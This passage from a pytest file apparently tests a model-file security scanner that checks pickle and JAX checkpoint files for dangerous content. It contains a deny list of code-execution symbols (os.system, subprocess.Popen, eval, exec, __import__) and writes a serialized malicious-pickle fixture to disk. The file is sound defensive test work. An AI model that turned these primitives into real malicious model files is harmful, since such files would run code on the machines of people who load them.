        "modelaudit.scanners.jax_checkpoint_scanner.JaxCheckpointScanner.scan_pickle_pattern_text",
        fail_if_called,
    )

    scanner._scan_jax_checkpoint_patterns_if_needed(str(path), len(payload), payload, result)


def test_pickle_scanner_uses_jax_window_beyond_root_raw_scan_limit(tmp_path: Path) -> None:
    path = tmp_path / "late-jax.pkl"
    path.write_bytes(pickle.dumps({"padding": "a" * 256, "payload": "jax.experimental.io_callback"}))

    result = PickleScanner(
        config={
            "pickle_root_raw_scan_limit_bytes": 64,
            "jax_pickle_max_scan_bytes": 1024,
        }
    ).scan(str(path))

    assert any(
        check.name == "JAX Pattern Security Check"
        and check.status == CheckStatus.FAILED
        and check.details["pattern"] == r"jax\.experimental\.io_callback"
        for check in result.checks
    )


def test_pickle_scanner_delegates_late_jax_patterns_for_ckpt_suffixes(tmp_path: Path) -> None:
    path = tmp_path / "late-jax.ckpt"
    path.write_bytes(pickle.dumps({"padding": "a" * 9000, "payload": "jax.experimental.io_callback"}))

    result = PickleScanner().scan(str(path))

    assert any(
        check.name == "JAX Pattern Security Check"
        and check.status == CheckStatus.FAILED
        and check.details["pattern"] == r"jax\.experimental\.io_callback"
        for check in result.checks
    )


def test_pickle_scanner_reports_jax_truncation_as_inconclusive_info(tmp_path: Path) -> None:
    path = tmp_path / "large-benign.pkl"
    path.write_bytes(pickle.dumps({"padding": "a" * 4096}))

    result = PickleScanner(config={"jax_pickle_max_scan_bytes": 1024}).scan(str(path))

    prefix_limit_checks = [check for check in result.checks if check.name == "Pickle Checkpoint Prefix Scan Limit"]
    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["jax_pickle_scan_limit_exceeded"]
    assert len(prefix_limit_checks) == 1
    assert prefix_limit_checks[0].severity == IssueSeverity.INFO
    assert prefix_limit_checks[0].details["analysis_incomplete"] is True
    assert prefix_limit_checks[0].details["scan_outcome_reason"] == "jax_pickle_scan_limit_exceeded"


def test_pickle_scanner_fails_closed_when_jax_payload_is_after_delegated_scan_window(tmp_path: Path) -> None:
    path = tmp_path / "late-hidden-jax.pkl"
    path.write_bytes(pickle.dumps({"padding": "a" * 4096, "payload": "jax.experimental.io_callback"}))

    result = PickleScanner(config={"jax_pickle_max_scan_bytes": 1024}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["scan_outcome_reasons"] == ["jax_pickle_scan_limit_exceeded"]
    prefix_limit_check = next(check for check in result.checks if check.name == "Pickle Checkpoint Prefix Scan Limit")
    assert prefix_limit_check.severity == IssueSeverity.INFO
    assert prefix_limit_check.details["analysis_incomplete"] is True
    assert not any(
        check.name == "JAX Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_policy_compatibility_exports_cover_required_dangerous_symbols() -> None:
    assert {"os.system", "subprocess.Popen", "eval", "exec", "__import__"} <= ALWAYS_DANGEROUS_FUNCTIONS
    assert {"os", "subprocess", "posix", "nt"} <= ALWAYS_DANGEROUS_MODULES
    assert is_suspicious_global("builtins", "eval") is True
    assert is_suspicious_global("builtins", "len") is False
    assert is_suspicious_global("os", "system") is True
    assert is_suspicious_global("os.path", "join") is False
    assert _is_dangerous_module("os.path") is False
    assert is_suspicious_global("json", "loads") is False


def test_legitimate_serialization_file_uses_rust_scan(tmp_path: Path) -> None:
    safe_path = tmp_path / "safe.joblib"
    safe_path.write_bytes(b"\x80\x04cjoblib.numpy_pickle\nNumpyArrayWrapper\nq\x00.")
    malicious_path = tmp_path / "evil.joblib"
    malicious_path.write_bytes(pickle.dumps(MaliciousPayload(), protocol=4))
    text_path = tmp_path / "not-pickle.joblib"
    text_path.write_text("not a pickle", encoding="utf-8")

    assert _is_legitimate_serialization_file(str(safe_path)) is True
    assert _is_legitimate_serialization_file(str(malicious_path)) is False
    assert _is_legitimate_serialization_file(str(text_path)) is False


def test_legitimate_serialization_file_skips_call_graph_enrichment(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    safe_path = tmp_path / "safe.joblib"
    safe_path.write_bytes(b"\x80\x04cjoblib.numpy_pickle\nNumpyArrayWrapper\nq\x00.")

    def fail_call_graph_enrichment(_report: object) -> object:
        raise AssertionError("validation helper should use native Rust findings only")

    monkeypatch.setattr("modelaudit_picklescan.api._with_call_graph_findings", fail_call_graph_enrichment)

    assert _is_legitimate_serialization_file(str(safe_path)) is True


def test_legitimate_serialization_file_keeps_bounded_file_reads(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    safe_path = tmp_path / "safe.joblib"
    safe_path.write_bytes(b"\x80\x04cjoblib.numpy_pickle\nNumpyArrayWrapper\nq\x00.")

    def fail_read_bytes(_path: Path) -> bytes:
        raise AssertionError("validation helper should preserve bounded scanner reads")

    monkeypatch.setattr(Path, "read_bytes", fail_read_bytes)

    assert _is_legitimate_serialization_file(str(safe_path)) is True


def test_scan_missing_path_fails_closed(tmp_path: Path) -> None:
    path = tmp_path / "missing.pkl"

    result = PickleScanner().scan(str(path))

    assert result.success is False
    assert any(check.name == "Path Exists" for check in result.checks)
